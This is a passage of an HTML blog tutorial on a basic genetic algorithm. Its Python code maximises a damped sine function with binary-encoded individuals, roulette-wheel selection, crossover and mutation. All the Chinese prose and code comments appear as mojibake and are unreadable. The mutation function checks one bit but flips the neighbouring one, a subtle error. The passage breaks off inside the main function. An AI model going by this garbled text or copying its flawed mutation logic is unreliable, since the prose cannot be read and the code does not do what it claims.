ï¼ˆgeneï¼‰</strong>ç¼–ç çš„ä¸€å®šæ•°ç›®çš„<strong>ä¸ªä½“(individual)</strong>ç»„æˆã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ¯ä¸ªä¸ªä½“å®é™…ä¸Šæ˜¯<strong>æŸ“è‰²ä½“(chromosome)</strong>å¸¦æœ‰ç‰¹å¾çš„å®ä½“ã€‚æŸ“è‰²ä½“ä½œä¸ºé—ä¼ ç‰©è´¨çš„ä¸»è¦è½½ä½“ï¼Œå³å¤šä¸ªåŸºå› çš„é›†åˆï¼Œå…¶å†…éƒ¨è¡¨ç°ï¼ˆå³åŸºå› å‹ï¼‰æ˜¯æŸç§åŸºå› ç»„åˆï¼Œå®ƒå†³å®šäº†ä¸ªä½“çš„å½¢çŠ¶çš„å¤–éƒ¨è¡¨ç°ï¼Œå¦‚é»‘å¤´å‘çš„ç‰¹å¾æ˜¯ç”±æŸ“è‰²ä½“ä¸­æ§åˆ¶è¿™ä¸€ç‰¹å¾çš„æŸç§åŸºå› ç»„åˆå†³å®šçš„ã€‚å› æ­¤ï¼Œåœ¨ä¸€å¼€å§‹éœ€è¦å®ç°ä»è¡¨ç°å‹åˆ°åŸºå› å‹çš„æ˜ å°„å³ç¼–ç å·¥ä½œã€‚ç”±äºä»¿ç…§åŸºå› ç¼–ç çš„å·¥ä½œå¾ˆå¤æ‚ï¼Œæˆ‘ä»¬å¾€å¾€è¿›è¡Œç®€åŒ–ï¼Œå¦‚<strong>äºŒè¿›åˆ¶ç¼–ç </strong>ï¼Œåˆä»£ç§ç¾¤äº§ç”Ÿä¹‹åï¼ŒæŒ‰ç…§é€‚è€…ç”Ÿå­˜å’Œä¼˜èƒœåŠ£æ±°çš„åŸç†ï¼Œ<strong>é€ä»£ï¼ˆgenerationï¼‰</strong>æ¼”åŒ–äº§ç”Ÿå‡ºè¶Šæ¥è¶Šå¥½çš„è¿‘ä¼¼è§£ï¼Œåœ¨æ¯ä¸€ä»£ï¼Œæ ¹æ®é—®é¢˜åŸŸä¸­ä¸ªä½“çš„<strong>é€‚åº”åº¦ï¼ˆfitnessï¼‰</strong>å¤§å°<strong>é€‰æ‹©ï¼ˆselectionï¼‰</strong>ä¸ªä½“ï¼Œå¹¶å€ŸåŠ©äº<strong>è‡ªç„¶é—ä¼ å­¦çš„é—ä¼ ç®—å­ï¼ˆgenetic operatorsï¼‰</strong>è¿›è¡Œ<strong>ç»„åˆäº¤å‰ï¼ˆcrossoverï¼‰å’Œå˜å¼‚ï¼ˆmutationï¼‰</strong>ï¼Œäº§ç”Ÿå‡ºä»£è¡¨æ–°çš„è§£é›†çš„ç§ç¾¤ã€‚è¿™ä¸ªè¿‡ç¨‹å°†å¯¼è‡´ç§ç¾¤åƒ<strong>è‡ªç„¶è¿›åŒ–</strong>ä¸€æ ·çš„åç”Ÿä»£ç§ç¾¤æ¯”å‰ä»£æ›´åŠ é€‚åº”äºç¯å¢ƒï¼Œæœ«ä»£ç§ç¾¤ä¸­çš„æœ€ä¼˜ä¸ªä½“ç»è¿‡<strong>è§£ç ï¼ˆdecodingï¼‰</strong>ï¼Œå¯ä»¥ä½œä¸ºé—®é¢˜è¿‘ä¼¼æœ€ä¼˜è§£ã€‚</p><p>é—ä¼ ç®—æ³•çš„ç»„æˆä¸»è¦åŒ…æ‹¬4ä¸ªéƒ¨åˆ†ï¼š<br>ï¼ˆ1ï¼‰ç¼–ç <br>ï¼ˆ2ï¼‰é€‚åº”åº¦å‡½æ•°<br>ï¼ˆ3ï¼‰é—ä¼ ç®—å­ï¼ˆé€‰æ‹©ï¼Œäº¤å‰ï¼Œå˜å¼‚ï¼‰<br>ï¼ˆ4ï¼‰è¿è¡Œå‚æ•° </p><p><strong>é€‰æ‹©ã€äº¤å‰å’Œå˜å¼‚</strong>æ„æˆäº†é—ä¼ ç®—æ³•çš„é—ä¼ æ“ä½œï¼›<strong>å‚æ•°ç¼–ç ã€åˆå§‹ç¾¤ä½“çš„è®¾å®šã€é€‚åº”åº¦å‡½æ•°çš„è®¾è®¡ã€é—ä¼ æ“ä½œè®¾è®¡ã€æ§åˆ¶å‚æ•°</strong>è®¾å®šäº”ä¸ªè¦ç´ ç»„æˆäº†é—ä¼ ç®—æ³•çš„æ ¸å¿ƒå†…å®¹ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018083211.png" alt=""></p></blockquote><h2 id="ç¼–ç ä¸è§£ç "><a href="#ç¼–ç ä¸è§£ç " class="headerlink" title="ç¼–ç ä¸è§£ç "></a>ç¼–ç ä¸è§£ç </h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; é—ä¼ ç®—æ³•çš„å®è¡Œï¼Œé¦–å…ˆéœ€è¦ç¡®å®šç¼–ç å’Œè§£ç çš„å½¢å¼ï¼Œç”Ÿç‰©ä½“çš„é—ä¼ å°±æ˜¯é€šè¿‡æŸ“è‰²ä½“ä»¥åŠåŸºå› è¿›è¡Œï¼Œç¼–ç å½¢å¼å¤šç§å¤šæ ·ï¼Œèƒ½å¤Ÿä½¿ç”¨å­—æ¯ï¼Œå®æ•°ï¼Œæˆ–è€…æ˜¯äºŒè¿›åˆ¶æ¥è¿›è¡Œç¼–ç ã€‚ä½†æ˜¯å› ä¸ºåšä¸»åˆšå¼€å§‹å­¦é—ä¼ ç®—æ³•ï¼Œä¾¿æ‹¿SGAï¼ˆåŸºæœ¬é—ä¼ ç®—æ³•ï¼‰æ¥å¯¹é—ä¼ ç®—æ³•è¿›è¡Œä¸€ä¸ªç®€å•çš„ç†è§£ã€‚</p><p>ç›´æ¥ä¸Šä¾‹é¢˜è¯´æ˜ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018095823.png" alt=""></p><p>æˆ‘ä»¬éœ€è¦æ±‚æ­¤å‡½æ•°åœ¨[-2,2]åŒºé—´ä¸‹çš„æœ€å¤§å€¼ï¼Œå…ˆç”¨pythonç”»ä¸€ä¸‹å‡½æ•°å›¾å½¢ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'local max'</span><span class="token punctuation">,</span> xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.4</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            arrowprops<span class="token operator">=</span>dict<span class="token punctuation">(</span>facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> shrink<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å‡½æ•°å›¾åƒå¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018183218.png" alt=""></p><p>[-2,2]åŒºé—´å·²ç»åˆ†ä¸º10000ä¸ªç­‰ä»½ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºæœ€å¤§å€¼ï¼ŒSGAåŸºæœ¬é—ä¼ ç®—æ³•å°±æ˜¯ç”¨äºŒè¿›åˆ¶ç¼–ç æ¥è¡¨ç¤ºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠ2^14ï¼Œå³åå››ä½äºŒè¿›åˆ¶ç”¨ä½œç¼–ç æ¥è¡¨ç¤ºä¸ªä½“ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105024.png" alt=""></p></blockquote><h2 id="åˆå§‹åŒ–ç§ç¾¤"><a href="#åˆå§‹åŒ–ç§ç¾¤" class="headerlink" title="åˆå§‹åŒ–ç§ç¾¤"></a>åˆå§‹åŒ–ç§ç¾¤</h2><blockquote><p>å·²ç»å†³å®šç”¨åå››ä½äºŒè¿›åˆ¶æ¥è¡¨ç¤ºç§ç¾¤ä¸ªä½“äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹ç§ç¾¤è¿›è¡Œåˆå§‹åŒ–ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#åˆå§‹åŒ–ç§ç¾¤ä¸ªä½“</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>       <span class="token comment" spellcheck="true">#éšæœºäº§ç”Ÿä¸ªä½“</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population</code></pre><p>å°†ç§ç¾¤åˆå§‹åŒ–ç¼–ç åï¼Œè‡ªå®šä¹‰è§£ç æ–¹æ³•ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#è§£ç </span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>   flag <span class="token operator">=</span> <span class="token number">0</span>   Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#print(population)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºæ•´å‹æ•°å€¼</span>       x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>       x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>       Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>       <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>   <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation   <span class="token comment" spellcheck="true">#return express</span>   <span class="token comment" spellcheck="true"># print(bx[0:100])</span>   <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span></code></pre></blockquote><h2 id="è®¡ç®—é€‚åº”åº¦"><a href="#è®¡ç®—é€‚åº”åº¦" class="headerlink" title="è®¡ç®—é€‚åº”åº¦"></a>è®¡ç®—é€‚åº”åº¦</h2><blockquote><p>æ ¹æ®ç§ç¾¤ä¸ªä½“çš„é€‚åº”åº¦æˆ‘ä»¬å¯ä»¥è¿›è¡Œåé¢çš„é€‰æ‹©æ·˜æ±°æ–¹æ³•ï¼Œä¸åŒçš„é—®é¢˜æœ‰ä¸åŒçš„é€‚åº”åº¦è®¡ç®—æ–¹æ³•<br> è€Œæœ¬ä¾‹é¢˜åˆ™ï¼Œç›´æ¥ç”¨ç›®æ ‡å‡½æ•°ä½œä¸ºé€‚åº”åº¦å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#æ ¹æ®å‡½æ•°åŸå‹è®¡ç®—è¡¨ç°å‹ï¼ˆyå€¼)ï¼Œå³é€‚åº”åº¦</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ç”±äºæ˜¯è®¡ç®—æœ€å¤§å€¼ï¼Œè‹¥å­˜åœ¨æ­£æ•°åˆ™ç›´æ¥å»é™¤è´Ÿæ•°ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population</code></pre></blockquote><h2 id="å®šä¹‰é€‰æ‹©æ–¹æ³•"><a href="#å®šä¹‰é€‰æ‹©æ–¹æ³•" class="headerlink" title="å®šä¹‰é€‰æ‹©æ–¹æ³•"></a>å®šä¹‰é€‰æ‹©æ–¹æ³•</h2><blockquote><p>ä¸ªä½“ç”Ÿå­˜æ¦‚ç‡å…¬å¼ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105143.png" alt=""></p></blockquote><blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018145013.png" alt=""></p><p>æ ¹æ®é€‚åº”åº¦ä»¥åŠé—ä¼ æ¦‚ç‡ï¼Œè¿›è¡Œé€‰æ‹©ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#å®šä¹‰ç‰©ç«å¤©æ‹©,å¼±è€…æ·˜æ±°</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#è½®ç›˜èµŒé€‰æ‹©,æŸ“è‰²ä½“ç´¯è®¡æ¦‚ç‡</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#è¿›è¡Œé€‰æ‹©ï¼Œæ·˜æ±°å¼±è€…ï¼Œè·å–æ–°ç§ç¾¤</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ç•™ä¸‹ä¼˜ç§€ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span></code></pre></blockquote><h2 id="å®šä¹‰äº¤å‰æ–¹æ³•"><a href="#å®šä¹‰äº¤å‰æ–¹æ³•" class="headerlink" title="å®šä¹‰äº¤å‰æ–¹æ³•"></a>å®šä¹‰äº¤å‰æ–¹æ³•</h2><blockquote><p>åƒæŸ“è‰²ä½“ä¸€æ ·ï¼Œä¹Ÿè¿›è¡Œäº¤å‰æ“ä½œï¼Œå¹¶ä¸”ç»™ä¸äº¤å‰æ“ä½œäº§ç”Ÿçš„æ¦‚ç‡ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#äº¤å‰ç®—å­</span><span class="token comment" spellcheck="true">#population_newä¸ºé€‰æ‹©ä¸‹æ¥çš„ç§ç¾¤ï¼Œpcä¸ºäº¤å‰æ¦‚ç‡</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="å®šä¹‰å˜å¼‚æ–¹æ³•"><a href="#å®šä¹‰å˜å¼‚æ–¹æ³•" class="headerlink" title="å®šä¹‰å˜å¼‚æ–¹æ³•"></a>å®šä¹‰å˜å¼‚æ–¹æ³•</h2><blockquote><p>å³ä½¿åŸºå› çªå˜çš„æ¦‚ç‡æå°ï¼Œä½†ä¹Ÿéœ€è¦å®šä¹‰ä¸€ä¸ªåŸºå› çªå˜æ–¹æ³•ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#å˜å¼‚ç®—å­</span><span class="token comment" spellcheck="true">#offspringä¸ºäº¤å‰åçš„ç§ç¾¤ï¼Œpmä¸ºåŸºå› å˜å¼‚æ¦‚ç‡</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="å¼€å§‹è¿­ä»£è¿›åŒ–"><a href="#å¼€å§‹è¿­ä»£è¿›åŒ–" class="headerlink" title="å¼€å§‹è¿­ä»£è¿›åŒ–"></a>å¼€å§‹è¿­ä»£è¿›åŒ–</h2><blockquote><p>ä¸»å‡½æ•°å¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token 